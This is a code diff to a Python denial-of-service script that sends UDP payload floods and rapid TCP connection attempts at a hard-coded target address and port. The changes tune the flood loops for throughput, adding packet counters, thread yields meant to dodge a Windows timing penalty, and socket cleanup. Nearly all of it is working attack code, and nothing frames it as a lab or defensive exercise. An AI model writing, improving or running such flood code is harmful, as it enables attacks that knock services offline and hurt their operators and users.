@@ -3,7 +3,7 @@ import threading
 import subprocess
 import os
 import random
-import sys
+import time
 
 TARGET_IP = "192.168.50.50"
 TARGET_PORT = 8443
@@ -21,17 +21,27 @@ def stop_all():
 def udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = random.randbytes(1024)
+    counter = 0
     while attack_flag:
-        try: sock.sendto(payload, (TARGET_IP, TARGET_PORT))
+        try: 
+            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
+            counter += 1
+            if counter % 5000 == 0:
+                time.sleep(0) # Yields thread without the 15ms Windows penalty
         except: pass
+    sock.close()
 
 def tcp_flood():
+    counter = 0
     while attack_flag:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.1)
             sock.connect((TARGET_IP, TARGET_PORT))
             sock.close()
+            counter += 1
+            if counter % 1000 == 0:
+                time.sleep(0)
         except: pass
 
 def launch_attack(mode):
